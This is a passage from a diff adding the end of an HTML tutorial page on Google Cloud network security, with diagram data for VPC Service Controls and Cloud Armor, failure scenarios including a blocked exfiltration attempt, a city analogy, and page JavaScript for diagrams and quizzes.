+      "product": "Internal Workloads (Private Subnet)",
+      "group": "g-vpc-dmz",
+      "plane": "data",
+      "x": 440,
+      "y": 200,
+      "detail": "Processes client requests; calls backend storage via Private Service Connect."
+    },
+    {
+      "id": "vpcsc-guard",
+      "label": "VPC Service Perimeter",
+      "product": "Access Context Manager Rules",
+      "group": "g-vpcsc-perimeter",
+      "plane": "control",
+      "x": 780,
+      "y": 140,
+      "detail": "Strict boundary enclosing BigQuery and GCS; blocks data transfers outside perimeter."
+    },
+    {
+      "id": "secure-bq",
+      "label": "Confidential BigQuery Data",
+      "product": "Protected Analytic Dataset",
+      "group": "g-vpcsc-perimeter",
+      "plane": "data",
+      "x": 780,
+      "y": 280,
+      "detail": "Customer PII data accessible only from authorized IPs and VPC perimeters."
+    }
+  ],
+  "edges": [
+    {
+      "id": "e1",
+      "from": "armor-waf",
+      "to": "frontend-gke",
+      "label": "1. Forward Sanitized Traffic",
+      "plane": "data"
+    },
+    {
+      "id": "e2",
+      "from": "rate-limiter",
+      "to": "frontend-gke",
+      "label": "2. Allow Valid Rate Ingress",
+      "plane": "data"
+    },
+    {
+      "id": "e3",
+      "from": "frontend-gke",
+      "to": "vpcsc-guard",
+      "label": "3. Cross-Perimeter PSC Query",
+      "plane": "data"
+    },
+    {
+      "id": "e4",
+      "from": "vpcsc-guard",
+      "to": "secure-bq",
+      "label": "4. Verify Ingress Policy & Query",
+      "plane": "control"
+    }
+  ],
+  "steps": [
+    {
+      "n": 1,
+      "title": "Edge Threat Filtering",
+      "edges": [
+        "e1",
+        "e2"
+      ],
+      "action": "Cloud Armor inspects HTTP request, blocks SQL injection attempt, and permits clean traffic.",
+      "why_traversal": "Eliminates attack payloads before they reach application containers.",
+      "protocol": "WAF Rule Engine",
+      "plane": "Data Plane",
+      "check": {
+        "metrics": "request_count and error_count",
+        "logs": "severity>=ERROR",
+        "commands": "gcloud services list --enabled"
+      }
+    },
+    {
+      "n": 2,
+      "title": "Perimeter Verification & Data Access",
+      "edges": [
+        "e3",
+        "e4"
+      ],
+      "action": "VPC-SC validates that request originates from authorized GKE VPC and permits BigQuery read.",
+      "why_traversal": "Strictly isolates sensitive data from unauthorized exfiltration routes.",
+      "protocol": "VPC Service Controls Enforcement",
+      "plane": "Control Plane",
+      "check": {
+        "metrics": "request_count and error_count",
+        "logs": "severity>=ERROR",
+        "commands": "gcloud services list --enabled"
+      }
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "data-exfil-attempt",
+      "label": "Insider Data Exfiltration Thwarted",
+      "changes": {
+        "failedNodes": [
+          "vpcsc-guard"
+        ],
+        "failedEdges": [
+          "e4"
+        ]
+      },
+      "root_cause": "Compromised GKE pod attempted to copy BigQuery data to an external personal GCS bucket.",
+      "diverted_path": "VPC-SC blocks outbound transfer: VPC_SERVICE_CONTROLS_VIOLATION.",
+      "blast_radius": "Zero data leaked; security alert dispatched to SCC in real time.",
+      "recovery": "Investigate compromised pod, rotate pod service account, and quarantine node."
+    },
+    {
+      "id": "quota-exhausted",
+      "label": "Quota exhausted",
+      "changes": {
+        "failedNodes": [
+          "armor-waf"
+        ],
+        "failedEdges": [
+          "e1"
+        ]
+      },
+      "root_cause": "A project or regional quota reaches its allocation limit.",
+      "diverted_path": "Requests surface elevated latency, errors, or denied actions.",
+      "blast_radius": "Consumers of the affected resource or dependency.",
+      "recovery": "Reduce load, restore the dependency, and add a tested prevention.",
+      "check": {
+        "metric": "error_count > 0",
+        "command": "gcloud logging read 'severity>=ERROR' --limit=20"
+      }
+    },
+    {
+      "id": "dependency-unavailable",
+      "label": "Dependency unavailable",
+      "changes": {
+        "failedNodes": [
+          "armor-waf"
+        ],
+        "failedEdges": [
+          "e1"
+        ]
+      },
+      "root_cause": "A required API or downstream dependency is unavailable.",
+      "diverted_path": "Requests surface elevated latency, errors, or denied actions.",
+      "blast_radius": "Consumers of the affected resource or dependency.",
+      "recovery": "Reduce load, restore the dependency, and add a tested prevention.",
+      "check": {
+        "metric": "error_count > 0",
+        "command": "gcloud logging read 'severity>=ERROR' --limit=20"
+      }
+    }
+  ],
+  "summary": "Shows the documented internals needed to predict behavior; undocumented details are observed behavior and may change."
+}
+</script>
+  <script id="brightloaf-data" type="application/json">{
+  "company_name": "Brightloaf Bakery",
+  "founder": "Bea the Baker",
+  "industry": "Artisanal Bakery & E-Commerce",
+  "stages": {
+    "early": {
+      "locations": 1,
+      "headquarters": "Portland, OR",
+      "architecture": "Single VM with local database",
+      "peak_qps": 5,
+      "compliance": "Standard GDPR / Basic PCI-DSS Tier 4",
+      "team_size": 2
+    },
+    "growth": {
+      "locations": 12,
+      "regions": ["us-west1", "us-central1"],
+      "architecture": "Three-tier containerized microservices on GKE / Cloud Run with Cloud SQL",
+      "peak_qps": 250,
+      "compliance": "PCI-DSS Tier 3, SOC2 Type II in progress",
+      "team_size": 8
+    },
+    "enterprise": {
+      "locations": 150,
+      "regions": ["us-west1", "us-central1", "us-east4", "europe-west1"],
+      "architecture": "Multi-region hybrid deployment, Cloud Spanner, Global Application Load Balancer, Dedicated Interconnect",
+      "peak_qps": 12000,
+      "compliance": "PCI-DSS Tier 1, SOC2 Type II, ISO 27001",
+      "team_size": 45
+    }
+  }
+}
+</script>
+  <script id="analogy-data" type="application/json">
+{
+  "topic_no": "035",
+  "roadmap_id": "5.2",
+  "title": "Cloud City: Network Security: VPC Service Controls, Cloud Armor & Firewalls",
+  "city_concept": "City Perimeter Fortifications & Inspection Gates",
+  "beats": [
+    {
+      "step": 1,
+      "name": "The City Problem",
+      "story": "Smugglers were sneaking contraband through unregulated river docks and loading municipal wagons to ship city secrets outside the gates.",
+      "analogy_elements": [
+        "Unregulated Chaos",
+        "Disorganized Dispatch"
+      ]
+    },
+    {
+      "step": 2,
+      "name": "The City Solution",
+      "story": "Warden Ward erected fortified perimeter walls (VPC Service Controls) and customs inspection checkpoints (Cloud Armor).",
+      "analogy_elements": [
+        "Municipal Charter",
+        "Civic Dispatcher"
+      ]
+    },
+    {
+      "step": 3,
+      "name": "City Under Stress",
+      "story": "When a rogue merchant attempted to take municipal gold bars through the east gate, automated weight sensors locked the turnstile.",
+      "analogy_elements": [
+        "Traffic Gridlock",
+        "Automated Relief Gates"
+      ]
+    },
+    {
+      "step": 4,
+      "name": "Where Metaphor Breaks",
+      "story": "City stone gates take days to rebuild; cloud perimeter policies update globally across Google's edge network in seconds.",
+      "analogy_elements": [
+        "Physical City vs Software SDN"
+      ]
+    }
+  ]
+}
+  </script>
+
+  <script src="../assets/diagram-engine.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const specD1 = JSON.parse(document.getElementById('spec-d1-data').textContent);
+      const specD2 = JSON.parse(document.getElementById('spec-d2-data').textContent);
+      const specD3 = JSON.parse(document.getElementById('spec-d3-data').textContent);
+      window.analogyData = JSON.parse(document.getElementById('analogy-data').textContent);
+
+      new DiagramEngine('diagram-d1', specD1);
+      new DiagramEngine('diagram-d2', specD2);
+      new DiagramEngine('diagram-d3', specD3);
+      new DiagramEngine('diagram-d4', JSON.parse(document.getElementById('spec-d4-data').textContent));
+      new DiagramEngine('diagram-d5', JSON.parse(document.getElementById('spec-d5-data').textContent));
+      new DiagramEngine('diagram-d6', JSON.parse(document.getElementById('spec-d6-data').textContent));
+
+      showAnalogyBeat(1);
+    });
+
+    function showAnalogyBeat(stepNum) {
+      if (!window.analogyData) return;
+      const beat = window.analogyData.beats.find(b => b.step === stepNum);
+      if (!beat) return;
+
+      const container = document.getElementById('analogy-display');
+      container.innerHTML = `
+        <h4 style="margin-top:0; color:var(--accent);">Beat ${beat.step}: ${beat.name}</h4>
+        <p style="font-size:12.5px; line-height:1.6; color:var(--text-main);">${beat.story}</p>
+        <div style="font-size:11.5px; color:var(--text-dim);">
+          <strong style="color:#fb923c;">Analogy Tokens:</strong> ${beat.analogy_elements.join(' • ')}
+        </div>
+      `;
+
+      document.querySelectorAll('.stepper-btn').forEach((btn, idx) => {
+        btn.classList.toggle('active', (idx + 1) === stepNum);
+      });
+    }
+
+    function toggleSolution() {
+      const block = document.getElementById('solution-block');
+      const btn = document.getElementById('toggle-solution-btn');
+      if (block.style.display === 'none') {
+        block.style.display = 'block';
+        btn.textContent = '🙈 Hide Solution & Rubric';
+      } else {
+        block.style.display = 'none';
+        btn.textContent = '👁 Show Solution & Rubric';
+      }
+    }
+
+    function checkQuiz(element, isCorrect, explanation) {
+      const card = element.closest('.quiz-card');
+      const options = card.querySelectorAll('.quiz-option');
+      options.forEach(opt => {
+        opt.style.borderColor = 'var(--panel-border)';
+        opt.style.background = 'var(--panel)';
+      });
+
+      element.style.borderColor = isCorrect ? 'var(--accent-green)' : 'var(--accent-red)';
+      element.style.background = isCorrect ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)';
+
+      const explEl = card.querySelector('.quiz-explanation');
+      explEl.style.display = 'block';
+      explEl.innerHTML = `<strong style="color:${isCorrect ? '#34d399' : '#f87171'};">${isCorrect ? '✅ Correct' : '❌ Incorrect'}:</strong> ${explanation}`;
+    }
+  </script>
+  <!-- Floating Quick Navigation Dock -->
+  <div class="floating-topic-dock" id="floating-topic-dock">
+    <a href="topic-034.html" class="dock-btn prev" title="Previous Topic: Advanced IAM, Federation & Zero Trust [Key: P]">← 034</a>
+    <span class="dock-indicator" title="Topic 035 of 60">035 / 060</span>
+    <a href="topic-036.html" class="dock-btn next" title="Next Topic: Data Protection: Cloud KMS & DLP [Key: N]">036 →</a>
+    <a href="../index.html" class="dock-btn index" title="Roadmap Overview [Key: I]">☰</a>
+  </div>
+
+  <script>
+    // Global Keyboard Navigation between topics
+    (function() {
+      const prevUrl = "topic-034.html";
+      const nextUrl = "topic-036.html";
+      document.addEventListener('keydown', (e) => {
+        if (['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName) || e.target.isContentEditable) return;
+        if (e.key === 'p' || e.key === 'P' || e.key === '[' || (e.key === 'ArrowLeft' && e.altKey)) {
+          if (prevUrl) window.location.href = prevUrl;
+        } else if (e.key === 'n' || e.key === 'N' || e.key === ']' || (e.key === 'ArrowRight' && e.altKey)) {
+          if (nextUrl) window.location.href = nextUrl;
+        } else if (e.key === 'i' || e.key === 'I') {
+          window.location.href = '../index.html';
+        }
+      });
+    })();
+  </script>
+  <!-- End Floating Quick Navigation Dock -->
+
+  <script src="../assets/site-interactions.js?v=20260924-4"></script>
+</body>
+</html>
